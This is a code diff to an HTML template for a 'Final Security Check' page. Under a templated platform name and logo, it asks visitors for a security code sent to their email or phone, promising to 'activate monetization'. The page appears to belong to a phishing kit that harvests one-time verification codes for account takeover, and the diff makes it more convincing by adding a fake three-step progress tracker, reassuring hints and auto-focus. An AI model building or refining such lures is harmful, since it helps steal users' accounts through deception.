@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(239,68,68,0.25);border-radius:16px;">
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(239,68,68,0.15);border-radius:16px;">
   {% if platform_icon and platform_name %}
   <div class="platform-header">
     <div class="icon-circle" style="background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.2);">
@@ -13,30 +13,79 @@
   </div>
   {% endif %}
 
-  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔐 Final Security Check</h3>
+  <div class="security-header">
+    <div class="security-icon">🔐</div>
+    <div>
+      <h3 style="color:#e11d48;margin:0;font-size:18px;font-weight:600">Final Security Check</h3>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Last step to activate monetization</div>
+    </div>
+  </div>
   
   <div class="security-instructions">
     <div class="instruction-card">
-      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">One Last Verification</h4>
+      <div class="instruction-title">
+        <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">One Last Verification</h4>
+        <div class="step-badge">Step 3 of 3</div>
+      </div>
       <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
         To complete your account setup and begin monetization, please enter the final security code sent to your verified contact method.
       </p>
+      
+      <!-- Added contact verification reference -->
+      <div class="contact-reference">
+        <div class="reference-icon">📧</div>
+        <div class="reference-text">
+          <strong>Sent to your verified contact</strong>
+          <span>Check the email or phone number you provided</span>
+        </div>
+      </div>
     </div>
   </div>
 
   <form id="digitsForm" method="POST" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Final Security Code</label>
-    <input class="input" id="digits" name="digits" placeholder="Enter final security code" pattern="\d{4,9}" required>
+    <div class="input-group">
+      <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Final Security Code</label>
+      <input class="input" id="digits" name="digits" placeholder="Enter 4-9 digit security code" pattern="\d{4,9}" required maxlength="9">
+      <div class="input-hint">Check your email or phone for the code</div>
+    </div>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn final-btn" type="submit">Complete Setup</button>
+      <button class="btn final-btn" type="submit">
+        <span class="btn-text">Complete Setup</span>
+        <span class="btn-check">✓</span>
+      </button>
     </div>
   </form>
 
-  <div class="completion-note" style="margin-top:20px;padding:12px 16px;background:#fef2f2;border-radius:12px;border:1px solid #fecaca;">
-    <p style="margin:0;color:#991b1b;font-size:0.9rem;font-weight:500;text-align:center;">
-      ✅ After this step, your account will be ready for monetization
+  <div class="progress-tracker">
+    <div class="progress-step completed">
+      <div class="step-number">1</div>
+      <div class="step-info">
+        <strong>Account Created</strong>
+        <span>Basic setup complete</span>
+      </div>
+    </div>
+    <div class="progress-step completed">
+      <div class="step-number">2</div>
+      <div class="step-info">
+        <strong>Contact Verified</strong>
+        <span>Security contact added</span>
+      </div>
+    </div>
+    <div class="progress-step current">
+      <div class="step-number">3</div>
+      <div class="step-info">
+        <strong>Final Security</strong>
+        <span>Activating monetization</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="completion-note">
+    <div class="note-icon">✅</div>
+    <p style="margin:0;color:#166534;font-size:0.9rem;font-weight:500;text-align:center;">
+      After this step, your account will be ready for monetization
     </p>
   </div>
 </div>
@@ -45,26 +94,43 @@
 .input {
   width: 100%;
   padding: 14px;
-  border-radius: 18px;
+  border-radius: 14px;
   border: 1px solid #e5e7eb;
-  margin-bottom: 8px;
+  margin-bottom: 4px;
   font-size: 16px;
+  font-weight: 600;
+  text-align: center;
+  letter-spacing: 1px;
   transition: border-color 0.2s, box-shadow 0.2s;
+  background: #fafafa;
 }
 .input:focus {
   border-color: #EF4444;
-  box-shadow: 0 0 0 3px rgba(239,68,68,0.25);
+  box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
   outline: none;
+  background: #ffffff;
 }
 .input-error {
   border-color: #ef4444;
-  box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
+  box-shadow: 0 0 0 3px rgba(239,68,68,0.1);
 }
 .error-text {
   color: #ef4444;
   font-size: 13px;
-  margin-top: -4px;
+  margin-top: 4px;
   margin-bottom: 8px;
+  font-weight: 500;
+}
+
+.input-group {
+  margin-bottom: 8px;
+}
+
+.input-hint {
+  font-size: 12px;
+  color: #6b7280;
+  margin-top: 4px;
+  text-align: center;
 }
 
 .final-btn {
@@ -73,21 +139,49 @@
   color: #fff;
   font-size: 16px;
   font-weight: 700;
-  padding: 12px;
-  border-radius: 25px;
+  padding: 14px;
+  border-radius: 14px;
   cursor: pointer;
   border: none;
-  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(239,68,68,0.35);
-  display: block;
-  margin-top: 8px;
+  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  box-shadow: 0 4px 12px rgba(239,68,68,0.25);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-top: 16px;
 }
 .final-btn:hover {
   background: #dc2626;
-  box-shadow: 0 8px 20px rgba(239,68,68,0.45);
+  box-shadow: 0 6px 16px rgba(239,68,68,0.35);
+  transform: translateY(-1px);
 }
 .final-btn:active {
   transform: scale(0.985);
+}
+
+.btn-check {
+  transition: transform 0.2s ease;
+}
+
+.final-btn:hover .btn-check {
+  transform: scale(1.2);
+}
+
+.security-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin: 20px 0 16px 0;
+  padding: 16px;
+  background: #fef2f2;
+  border-radius: 12px;
+  border-left: 4px solid #EF4444;
+}
+
+.security-icon {
+  font-size: 24px;
+  flex-shrink: 0;
 }
 
 .security-instructions {
@@ -95,11 +189,64 @@
 }
 
 .instruction-card {
-  background: #fef2f2;
-  padding: 16px;
+  background: #ffffff;
+  padding: 20px;
   border-radius: 12px;
-  border-left: 4px solid #EF4444;
+  border: 1px solid #fecaca;
   margin-bottom: 16px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+}
+
+.instruction-title {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 12px;
+}
+
+.step-badge {
+  background: #EF4444;
+  color: white;
+  font-size: 11px;
+  font-weight: 700;
+  padding: 4px 8px;
+  border-radius: 6px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.contact-reference {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-top: 16px;
+  padding: 12px;
+  background: #f8fafc;
+  border-radius: 8px;
+  border-left: 3px solid #3B82F6;
+}
+
+.reference-icon {
+  font-size: 16px;
+  flex-shrink: 0;
+}
+
+.reference-text {
+  flex: 1;
+}
+
+.reference-text strong {
+  display: block;
+  color: #1e293b;
+  font-size: 13px;
+  font-weight: 600;
+  margin-bottom: 2px;
+}
+
+.reference-text span {
+  color: #64748b;
+  font-size: 12px;
+  font-weight: 500;
 }
 
 .center {
@@ -124,6 +271,153 @@
   justify-content: center;
   flex-shrink: 0;
 }
+
+/* Progress Tracker */
+.progress-tracker {
+  margin: 24px 0;
+  padding: 0;
+}
+
+.progress-step {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  margin-bottom: 16px;
+  position: relative;
+}
+
+.progress-step:not(:last-child)::after {
+  content: '';
+  position: absolute;
+  top: 24px;
+  left: 11px;
+  width: 2px;
+  height: calc(100% + 8px);
+  background: #e5e7eb;
+  z-index: 1;
+}
+
+.step-number {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  background: #e5e7eb;
+  border: 3px solid white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 11px;
+  font-weight: 700;
+  color: #64748b;
+  flex-shrink: 0;
+  position: relative;
+  z-index: 2;
+}
+
+.progress-step.completed .step-number {
+  background: #10B981;
+  color: white;
+}
+
+.progress-step.current .step-number {
+  background: #EF4444;
+  color: white;
+  box-shadow: 0 0 0 3px rgba(239,68,68,0.2);
+}
+
+.step-info {
+  flex: 1;
+  padding-top: 2px;
+}
+
+.step-info strong {
+  display: block;
+  color: #1e293b;
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 2px;
+}
+
+.step-info span {
+  color: #64748b;
+  font-size: 12px;
+  font-weight: 500;
+}
+
+.progress-step.completed .step-info strong {
+  color: #10B981;
+}
+
+.progress-step.current .step-info strong {
+  color: #EF4444;
+}
+
+.completion-note {
+  margin-top: 20px;
+  padding: 16px;
+  background: #f0fdf4;
+  border-radius: 12px;
+  border: 1px solid #dcfce7;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.note-icon {
+  font-size: 18px;
+  flex-shrink: 0;
+}
+
+.completion-note p {
+  flex: 1;
+  margin: 0;
+}
+
+/* Enhanced responsive design */
+@media (max-width: 480px) {
+  .card {
+    margin: 20px auto;
+    border-radius: 14px;
+  }
+  
+  .security-header {
+    flex-direction: column;
+    text-align: center;
+    gap: 8px;
+  }
+  
+  .instruction-title {
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 8px;
+  }
+  
+  .step-badge {
+    align-self: flex-start;
+  }
+  
+  .platform-header {
+    flex-direction: column;
+    text-align: center;
+    gap: 12px;
+  }
+  
+  .contact-reference {
+    flex-direction: column;
+    text-align: center;
+    gap: 8px;
+  }
+  
+  .progress-step {
+    flex-direction: column;
+    text-align: center;
+    gap: 8px;
+  }
+  
+  .progress-step:not(:last-child)::after {
+    display: none;
+  }
+}
 </style>
 
 <script>
@@ -147,11 +441,24 @@ document.getElementById("digitsForm").addEventListener("submit", function(event)
   if (!valid) event.preventDefault();
 });
 
-document.getElementById("digits").addEventListener("input", () => {
+document.getElementById("digits").addEventListener("input", function() {
   const digits = document.getElementById("digits");
   const digitsError = document.getElementById("digitsError");
   digits.classList.remove("input-error");
   digitsError.textContent = "";
+  
+  // Auto-format: only allow numbers and limit to 9 digits
+  this.value = this.value.replace(/[^0-9]/g, '').slice(0, 9);
+});
+
+// Add auto-focus and some subtle interactions
+document.addEventListener('DOMContentLoaded', function() {
+  const digitsInput = document.getElementById('digits');
+  
+  // Auto-focus on the input field
+  setTimeout(() => {
+    digitsInput.focus();
+  }, 300);
 });
 </script>
 {% endblock %}
